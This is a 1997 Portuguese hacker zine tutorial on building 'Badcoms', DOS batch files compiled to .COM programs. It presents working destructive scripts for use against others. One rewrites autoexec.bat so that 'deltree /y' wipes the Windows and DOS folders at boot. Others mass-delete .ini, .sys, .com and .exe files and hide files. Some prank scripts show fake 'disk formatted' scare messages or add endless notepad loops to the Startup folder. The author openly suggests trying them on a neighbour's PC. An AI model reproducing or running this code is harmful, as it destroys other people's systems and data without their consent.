<HTML>
<HEAD>
<TITLE>.pt zine 02 - Badcom's Tutorial</TITLE>
</HEAD>
<BODY BGCOLOR="Black" TEXT="#000000" LINK="Green" VLINK="Red">
<IMG SRC="pt_small.gif" WIDTH=452 HEIGHT=81 BORDER=0>
<BR>
<FONT SIZE="3" FACE="Arial" COLOR="#FFC639">
<B>Badcom's TUTORIAL</B><BR>
by: SeQ MaSs&Icirc;vE
<BR>
<PRE>
---------------------------------------------------------------------
         /    /    /\      Badcom's TUTORIAL 
        /    /    /  \    -------------------
        \   /    /    \   09/97 - SeQ MaSs&Icirc;vE
         \  \--  \    /
         /   \    \  |
        /     \    \/ \
                       \
---------------------------------------------------------------------
</PRE>
<PRE>
<FONT SIZE="3" FACE="Arial" COLOR="#FFC639">
---------------------------------------------------------------------
Este texto foi produzido por SeQ MaSs&Icirc;vE e &eacute; totalmente proibida a 
edi&ccedil;&atilde;o, ou roubo de informa&ccedil;&otilde;es contidas no mesmo.

Texto editado no programa Notepad do Windows 95
---------------------------------------------------------------------

Introdu&ccedil;&atilde;o:

Badcom's s&atilde;o pequenos arquivos (.COM) que quando executados, eles re-
alizam tarefas em um determinado computador... ou seja, s&atilde;o programas
que faz com que um PC realize comandos quanto do DOS quanto do Windows.
Para isto vc deve fazer um arquvi de LOTE com os comandos e compilalo
O Mais famoso compilador de arquivos de LOTE (.BAT) &eacute; o BAT2EXE.COM.
Para adquiri-lo vc pode me mandar um E-mail que lhe passarei o arquivo.



Indice:

I   Comandos B&aacute;sicos e inofencivos.
II  Comandos Ofencivos.
III Alguns comandos avan&ccedil;ados em arquivos de LOTE.
IV  Exemplos Inofencivos.
V   Exemplos destrutivos.
VI  Como compilar um Badcom e seus Bugs e FAQ.
VII Usando Telas ANSI em BaDcOms.
!   Sobre o autor e como contacta-lo.



I Comandos B&aacute;sicos
------------------

@ECHO OFF

Comando para n&atilde;o ser mostrados as linhas de comando em uma janela do 
MS-DOS, Exemplo: Colocando o comando DIR em um Badcom sem o @ECHO OFF
no prompt ele mostrar&aacute; o comando escrito na janela.. C:\&gt;DIR
Com o comando @ECHO OFF, ele simplesmente elimina os digitos dos
comandos a serem mostrados.

CLS

Comando do MS-DOS, para limpar a tela.

ECHO

Para desativar o comando @ECHO OFF, e mostrar caracteres em uma janela
Exemplo: ECHO &quot;Mensagem&quot; Ir&aacute; mostrar a mensagem  na janela, ap&oacute;s isso
autom&aacute;ticamente retorna a n&atilde;o apari&ccedil;&atilde;o de comandos na Janela.
Criando arquivos com o comando ECHO:
Para criar um arquivo com este comando, &eacute; necess&aacute;rio o comando &gt;, 
exemplo: ECHO &gt; Nomedoarquivo.exten&ccedil;&atilde;o
Ir&aacute; criar o arquivo no ambiente do MS-DOS... 
Para criar arquivos com textos ou comandos, &eacute; necess&aacute;rio fazer o 
seguinte comando:
ECHO &gt; ARQ.EXT &quot;Comando ou mensagem&quot; OBS: As aspas s&atilde;o apenas para 
indica&ccedil;&atilde;o por&eacute;m em comandos n&atilde;o funcionam as aspas.
Ex: ECHO SEQ.BAT DIR
Ir&aacute; criar um arquivo chamado SEQ.BAT (Arquivo de Lote) Com o comando
DIR dentro do mesmo.



ATTRIB

Este comando permite que vc esconda um determinado arquivo, torne-o
somente para leitura, ou torne arquivo do sistema.
Para esconder um arquivo: Digite dentro do Badcom:
Para obter os comandos simplesmente digite na janela do MS-DOS:
ATTRIB /? 


MD

Para Criar diret&oacute;rios
Ex: MD NOMEDODIR


RD

Comando para Desfazer pastas vazias.
EX: RD PASTAVAZIA


PROGRAMAS !!


N&atilde;o &eacute; um comando.. heheh... &eacute; que nos Badcom's s&atilde;o muito util o uso
de programas comuns, como os padr&otilde;es do Windows 95.

Exemplo: O Programa Notepad.exe do Windows 95, para ele ser executado,
apartir de um Badcom, vc deve coloca-lo na linha de comando..
NOTEPAD.EXE
Para executar o programa apartir de um Badcom... no BAT coloque da 
segunite forma:
@echo off
cls
notepad.exe  &lt;--- N&atilde;o &eacute; nescess&aacute;rio colocar o Path do Windows 95, pois
                  Sendo executado durante o Windows, n&atilde;o acontecer&aacute; 
                  erros de n&atilde;o achar o programa..

Se quizer abrir textos com o tal programa !
notepad.exe arquivo.txt



II Comandos Ofencivos.
----------------------


DEL ou DELETE

Para apagar arquivos, no Badcom &eacute; usado da seguinte maneira,
Para deletar arquivos sem ter problemas de BUG, &eacute; necess&aacute;rio fazer com
que o comando n&atilde;o tenha a op&ccedil;&atilde;o (*.*), pois surgir&aacute; um prompt de 
confirma&ccedil;&atilde;o de exclus&atilde;o.
Digite ent&atilde;o da seguinte maneira:

DEL *.Exten&ccedil;&atilde;o, exemplo.. para apagar os arquivos .INI do diret&oacute;rio
do Windows: del Drive:\windir\*.ini  ou use:
drive:
cd\
cd windir
del *.ini


DELTREE

Muitos n&atilde;o tem conhecimento do que este comando pode causar em um
sistema, pois &eacute; usado da maneira b&aacute;sica...
Este &quot;pode ser&quot; o Mais perigoso comando contido em um Badcom.
Uso com BUG:
DELTREE DIRETORIO
Com este comando, aparecer&aacute; a confirma&ccedil;&atilde;o de exclus&atilde;o do diret&oacute;rio,
ser&aacute; muito dific&iacute;l algu&eacute;m responder SIM a pergunta n&atilde;o ???
Bem, vou informar o perigo deste comando...
H&aacute; uma op&ccedil;&atilde;o no DELTREE que evita a apari&ccedil;&atilde;o do prompt de confirma&ccedil;&atilde;o,
sendo ela a mais destrutiva, deletando todos os arquivos de um dir.
Bom, para usar o Deltree de forma destrutiva basta acrecentar a op&ccedil;&atilde;o
/Y no mesmo, Exemplo:

C:\&gt;Deltree /y windows
Excluindo windows...

hehe, gostaram n&atilde;o ??? mas vou falar uma coisa... tentem usar os 
Badcom's de forma inofenciva, evitando assim trastornos futuros..
Ahh, n&atilde;o vai testar em seu PC igual eu fiz no meu n&atilde;o.... tive que
reisntalar o Windows novamente, hehe ! Teste no vizinho...


REN

Al&eacute;m de n&atilde;o afetar muito em um sistema, o Rename &eacute; um comando que pode
causar dor de cabe&ccedil;a ao usuario atacado.. ex:
use o REN em diversos arquivos...

REN command.com command.seunick
REN Autoexec.bat autoexec.SeQ
e assim vai...


Bem estes s&atilde;o alguns comandos destrutiveis, para se aperfei&ccedil;oar nos
Comandos do MS-dos vc pode consultar o proprio HELP do Ms-dos, ele 
lhe dar&aacute; varias informa&ccedil;&otilde;es, como no FORMAT e etc..


III Alguns comandos avan&ccedil;ados em arquivos de LOTE.
--------------------------------------------------


GOTO


Este comando faz com que o BAT pule ou volte para determinada parte do
Programa.
Exemplo: O uso do GOTO &eacute; muito usado se quizer que n&atilde;o pare de repetir
determinado comando ... usando o comando CLS, veja:

@echo off
:INI      &lt;-- Indica a parte do programa onde vai ser voltado o comando
Cls           Usa-se dois ponto antes, outros exemplos s&atilde;o :START 
              :COME&Ccedil;O, :SEQ

GOTO INI  &lt;-- Aqui o comando GOTO, para voltar para o alvo indicado.


CHOICE

Comando que possibilita um prompt, exemplo:

CHOICE /c123456789

Para numeros ou letras &eacute; necess&aacute;rio o uso do /c, sem este comando
somente CHOICE, mostrar&aacute; o prompt: [Y,n]?
Com o /c e os numeros ir&aacute; mostrar: [1,2,3,4,5,6,7,8,9]?
Este comando precisa de um complemento, leia em: IF e Errorlevel

IF e ERRORLEVEL


Este &eacute; muito usado em Badcom's, ele possibilita o desenvolvimento de
quest&otilde;es e prompts para o usuario.
exemplo: este comando eu uso muito em pegadinhas e perguntas sacanas,
cada vez que o usuario erra a pergunta alguns arquivos s&atilde;o apagados.
Segudo tamb&eacute;m do comando CHOICE


Segue a string....

@echo off
cls
echo Seu sistema paralizou, o que deseja fazer ?
echo [1] Reiniciar
echo [2] Desligar
choice /c12  &lt;-- Mostrar&aacute; o prompt [1,2]?

if errorlevel 2 goto DES  &lt;- aqui o comando if e errorlevel, sendo
if errorlevel 1 goto REI     se o usuario precionar o 1, ele ir&aacute;
                             reiniciar o sistema

Percebe-se que a posi&ccedil;&atilde;o das strings come&ccedil;a do 2 e depois vai para o 1.
Qualquer d&uacute;vida nesta parte do badcom fale comigo!



IV  Exemplos Inofencivos.
-------------------------

Como &eacute; para Ms-Dos alguns caracteres n&atilde;o aparecem de forma correta,
mas compilado sim.

--------------Recortar----------------
@echo off
cls
echo BaDcOm By SeQ MaSs×vE
echo NaMe Of BaDcOm: AsK/v2.0
echo &thorn;
echo Your System now is my !!!
echo Please, to ta'ke this fu'king PC co'm Bac'k Answe'r thE shI't
echo Que'stio'n.......................... H'e's...
echo &thorn;&thorn;&thorn;&thorn; HoW tO mAkE a ViRu's ? &thorn;&thorn;&thorn;&thorn;
echo [1] Sorr'y i'm a fucking LammmArrrsss !
echo [2] Don't Ask u MoTheFuCk's
echo [3] ....
echo [4] What's a viRu's ??????????????????????????

Choice /n/c1234

if errorlevel 4 goto END
if errorlevel 3 goto END
if errorlevel 2 goto END
if errorlevel 1 goto END

:END

Cls
:OPS
echo ... HeY, u FuCkeD nOw....
echo ... PleAsE ReStaRt ThE FuCkiNg HdD forMatEd..
GoTo OPS

--------------Recortar----------------

@echo off
cls
echo BaDcOm By SeQ MaSs×vE
echo NamE of BadcoM: NoTePaD/V3.1
echo &gt; note1.txt It's a BaDcOm.....
echo &gt; note2.txt This Badcom show's messages to ya....
echo &gt; note3.txt BaDcOm'r a (TM) oF SeQ MaSsIvE...
echo &gt; note4.txt PlEaSe, press Ctrl+Alt+dEl for Stop'it !
echo &gt; note5.txt ThAnXXX.........

:INI

notepad note1.txt
notepad note2.txt
notepad note3.txt
notepad note4.txt
notepad note5.txt

Copy *.txt \windows\menuin~1\iniciar\

GOTO INI

--------------Recortar----------------

@echo off
:ini
echo BaDcOm By SeQ MaSs×vE
echo NaMe: ClS2.0
cls
echo &gt; Leiame.txt Exemplo de um simples Badcom... By SeQ MaSsIvE..
goto ini

--------------Recortar----------------


V   Exemplos destrutivos.
-------------------------


--------------Recortar----------------

@echo off
cls
echo BaDcOm By SeQ MaSs×vE
echo NaMe Of BaDcOm: AuToCrAsh/v2.0
cd\
del autoexec.bat
echo autoexec.1 @echo off
echo autoexec.2 cls
echo autoexec.3 deltree /y \windows\
echo autoexec.4 deltree /y \dos\
echo autoexec.5 deltree /y \meusdo~1\

echo autoexec.bat
copy autoexec.* autoexec.bat
del *.1
del *.2
del *.3
del *.4
del *.5

echo ThaNx fOr UsE SeQ MaSs×vE's BaDcOm AutocrasH v2.0

--------------Recortar----------------

@echo off
cls
echo Badcom By SeQ mAss×vE.........
echo NamE: No InI's 2.01
cd\
echo Searching....
cd win
cd windows
cd wind
cd windos
cd win95
cd wind95
cd win-95

del *.ini

--------------Recortar----------------

@echo off
cls
echo Badcom By SeQ mAss×vE.........
echo NaME: N0-SyS 1.0
cd\
del *.bat
del *.sys
del *.com
echo &gt; config.sys
echo &gt; autoexec.bat

cd windows

copy *.ini \autoexec.bat
copy *.ini \config.sys

del *.ini
del *.exe
deltree /y command
deltree /y system

attrib +h *.*
cd\
attrib +h *.*

--------------Recortar----------------


VI  Como compilar um Badcom e seus Bugs e FAQ.
----------------------------------------------


Para compilar um Badcom ele deve estar nomeado para nomedoarq.BAT
Use o programa BAT2EXE.COM, o mais conhecido compilador BAT.

Usando o Bat2exe.com
ap&oacute;s editar o Badcom em qualquer editor de textos.. (o Mais usado &eacute;
o EDIT do Ms-dos, pois n&atilde;o ocorrem erros de caracteres no ambiente
MS-DOS) use a sintaxe:

bat2exe nomedoarq.bat
apague o original ou renomeie, e execute o nomedoarq.COM para teste..
Claro que Badcom's somente para assustar.



H&aacute; alguns Bugs ao compilar um Badcom, se tiver problemas leia este FAQ
sobre badcom's vindo de minha antiga BBS, ou me contate pelo meu UIN,
no final deste texto.


1) O Bat2exe n&atilde;o est&aacute; compilando meu badcom com telas ANSI.

R: Ocorre um erro de telas ANSI se n&atilde;o inserir o comando echo antes de
cara linha da programa&ccedil;&atilde;o ANSI.
exemplo de uma linha ANSI

[0;36m³&Igrave;&Iacute;[1m&Iacute;&Ecirc;&Euml;´

O Programa Bat2exe n&atilde;o reconhece a linguagem ANSI, vc deve iserir o
comando echo antes da linha:

echo [0;36m³&Igrave;&Iacute;[1m&Iacute;&Ecirc;&Euml;´

Assim ir&aacute; compilar normalmente.


2) Meu badcom quando executado trava, o que e isso ?

R: Isso depende da vers&atilde;o so programa Bat2exe e de sua vers&atilde;o do MS-dos,
o programa bat2exe compila linhas DELETE para DEL, ocorrendo erros
na sua vers&atilde;o ms-Dos.

3) o programa bat2exe n&atilde;o esta compilando meu badcom, ja fiz de tudo
e esta tudo correto. qual o problema?


R: O Programa bat2exe como todo programa compilador, tem suas 
restri&ccedil;&otilde;es, uma delas &eacute; o numero de linhas de um badcom, se o badcom
for muito grande e conter varias telas ANSI, ele n&atilde;o compilar&aacute;, 
o programa n&atilde;o compila muitas telas ANSI iguais no mesmo arquivo.



VII Usando Telas ANSI em BaDcOms.
---------------------------------



Telas ANSI s&atilde;o muito uteis em u  Badcom, elas assustam quando o usuario
estiver com o programa ANSI.SYS carregado no config.sys.

Para fazer telas ANSI, vc pode ou ler o HELP do MS-dos e editar em
um texto, que &eacute; muito demorado, ou pegar um programa que edita 
telas ANSI, o mais famoso &eacute; o THEDRAW, editor de telas ANSI, @-code,
ASCII, etc.. para sistemas de BBS (Bulletin Board System).

Ap&oacute;s editar a telas ANSI, ela se parace com isto quando visto em um 
editor comum:


[?7h[40m[2J[40m


[0;1m [0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Euml;&Auml;¿ [0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Iacute;&Euml;¿ [0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Euml;&Auml;¿ [0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Iacute;&Euml;¿
[0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Iacute;&Euml;¿ [0m&Uacute;&Euml;&Iacute;[1m&Euml;&Iacute;&Euml;¿
 [0;36m³&Igrave;&Iacute;[1m&Iacute;&Ecirc;&Euml;´ [0;36m&Atilde;&Icirc;&Iacute;[1m&Iacute;&Iacute;&Icirc;´ [0;36m³º  [1m&Egrave;&Euml;´ [0;36m³º[6C³º  
[1mº³ [0;36m³º [1mº º³
 [0;34m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Ecirc;&Ugrave; [0;34m&Agrave;&Ecirc;   [1m&Ecirc;&Ugrave; [0;34m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Ecirc;&Ugrave; [0;34m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Ecirc;&Ugrave;
[0;34m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Ecirc;&Ugrave; [0;34m&Agrave;&Ecirc;   [1m&Ecirc;&Ugrave;
[16C[0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Euml;¿  [0m&Uacute;&Euml;   [1m&Euml;¿
[16C[0;36m³&Igrave;&Iacute;[1m&Iacute;&Ecirc;&Euml;¿ [0;36m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;¹³
[16C[0;34m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Ecirc;&Ugrave; [0;34m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Ecirc;&Ugrave;
[13C[0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Iacute;&Euml;¿ [0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Iacute;&Euml;¿ [0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Iacute;&Euml;¿
[13C[0;36m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Euml;¿ [0;36m&Atilde;&Icirc;&Iacute;[1m&Iacute;    [0;36m³º   [1mº³
[13C[0;34m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Ecirc;&Ugrave; [0;34m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Ecirc;&Ugrave; [0;34m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Icirc;&Ecirc;&Ugrave;
[0m&Uacute;&Euml;&Iacute;[1m&Euml;&Iacute;&Euml;¿ [0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Iacute;&Euml;¿ [0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Iacute;&Euml;¿ [0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Iacute;&Euml;¿ [0m&Uacute;&Euml;&Iacute;[1m&Euml;&Iacute;&Euml;¿
[0m&Uacute;&Euml;  [1m&Euml;¿ [0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Iacute;&Euml;¿
[0;36m³º [1mº º³ [0;36m&Atilde;&Icirc;&Iacute;[1m&Iacute;&Iacute;&Icirc;´ [0;36m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Euml;¿ [0;36m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Euml;¿    º   
[0;36m³º [1m&Eacute;¼&Ugrave; [0;36m&Atilde;&Icirc;&Iacute;[1m&Iacute;
[0;34m&Agrave;&Ecirc;   [1m&Ecirc;&Ugrave; [0;34m&Agrave;&Ecirc;   [1m&Ecirc;&Ugrave; [0;34m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Ecirc;&Ugrave; [0;34m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Ecirc;&Ugrave;
[0;34m&Agrave;&Ecirc;&Iacute;[1m&Ecirc;&Iacute;&Ecirc;&Ugrave; [0;34m&Agrave;&Ecirc;[1m&Iacute;¼   [0;34m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Ecirc;&Ugrave;









[0m[255D


Para passar isto para um badcom, vc precisa copiar e colar para o 
Badcom, mas quando colar o Badcom, vc precisa tronar isto em forma BAT, 
simplesmente coloque o comando ECHO antes de cada linha, n&atilde;o esquecendo
de dar um espa&ccedil;o ap&oacute;s o comando, veja a seguir o ANSI em forma BAT:


echo [?7h[40m[2J[40m


echo [0;1m [0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Euml;&Auml;¿ [0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Iacute;&Euml;¿ [0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Euml;&Auml;¿ [0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Iacute;&Euml;¿
[0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Iacute;&Euml;¿ [0m&Uacute;&Euml;&Iacute;[1m&Euml;&Iacute;&Euml;¿
echo  [0;36m³&Igrave;&Iacute;[1m&Iacute;&Ecirc;&Euml;´ [0;36m&Atilde;&Icirc;&Iacute;[1m&Iacute;&Iacute;&Icirc;´ [0;36m³º  [1m&Egrave;&Euml;´ [0;36m³º[6C³º  
[1mº³ [0;36m³º [1mº º³
echo  [0;34m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Ecirc;&Ugrave; [0;34m&Agrave;&Ecirc;   [1m&Ecirc;&Ugrave; [0;34m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Ecirc;&Ugrave;
[0;34m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Ecirc;&Ugrave; [0;34m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Ecirc;&Ugrave; [0;34m&Agrave;&Ecirc;   [1m&Ecirc;&Ugrave;
echo [16C[0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Euml;¿  [0m&Uacute;&Euml;   [1m&Euml;¿
echo [16C[0;36m³&Igrave;&Iacute;[1m&Iacute;&Ecirc;&Euml;¿ [0;36m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;¹³
echo [16C[0;34m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Ecirc;&Ugrave; [0;34m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Ecirc;&Ugrave;
echo [13C[0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Iacute;&Euml;¿ [0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Iacute;&Euml;¿ [0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Iacute;&Euml;¿
echo [13C[0;36m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Euml;¿ [0;36m&Atilde;&Icirc;&Iacute;[1m&Iacute;    [0;36m³º   [1mº³
echo [13C[0;34m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Ecirc;&Ugrave; [0;34m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Ecirc;&Ugrave; [0;34m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Icirc;&Ecirc;&Ugrave;
echo [0m&Uacute;&Euml;&Iacute;[1m&Euml;&Iacute;&Euml;¿ [0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Iacute;&Euml;¿ [0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Iacute;&Euml;¿ [0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Iacute;&Euml;¿
[0m&Uacute;&Euml;&Iacute;[1m&Euml;&Iacute;&Euml;¿ [0m&Uacute;&Euml;  [1m&Euml;¿ [0m&Uacute;&Euml;&Iacute;[1m&Iacute;&Iacute;&Euml;¿
echo [0;36m³º [1mº º³ [0;36m&Atilde;&Icirc;&Iacute;[1m&Iacute;&Iacute;&Icirc;´ [0;36m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Euml;¿ [0;36m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Euml;¿   
º    [0;36m³º [1m&Eacute;¼&Ugrave; [0;36m&Atilde;&Icirc;&Iacute;[1m&Iacute;
echo [0;34m&Agrave;&Ecirc;   [1m&Ecirc;&Ugrave; [0;34m&Agrave;&Ecirc;   [1m&Ecirc;&Ugrave; [0;34m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Ecirc;&Ugrave; [0;34m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Ecirc;&Ugrave;
[0;34m&Agrave;&Ecirc;&Iacute;[1m&Ecirc;&Iacute;&Ecirc;&Ugrave; [0;34m&Agrave;&Ecirc;[1m&Iacute;¼   [0;34m&Agrave;&Ecirc;&Iacute;[1m&Iacute;&Iacute;&Ecirc;&Ugrave;









echo [0m[255D




Com os badcom's vc pode fazer muitas coisas al&eacute;, destas que acabei 
de explicar, como por exemplo, mexer na mem&oacute;ria do PC, e criar 
diret&oacute;rios de imposs&iacute;vel acesso para o Windows 95 ou 3.11.



!   Sobre o autor e como contacta-lo.
-------------------------------------

Meu nick &eacute; SeQ MaSs&Icirc;vE, e vc's podem me encontar na Internet atrav&eacute;z
do ICQ (I Seek You), meu UIN (Universal Internet Number) &eacute; 1292685,
vc's tambem podem enviar E-mails para <a href="mailto:seq@bestway.com.br">seq@bestway.com.br</a> 


Obrigado por ler este texto , e se tiverem d&uacute;vidas, sugest&otilde;es e 
principalmente criticas, mande mensagens.. Obrigado!

SeQ MaSs&Icirc;vE.


---------------------------------------------------------------------
</FONT>
</PRE>

</BODY>
</HTML>
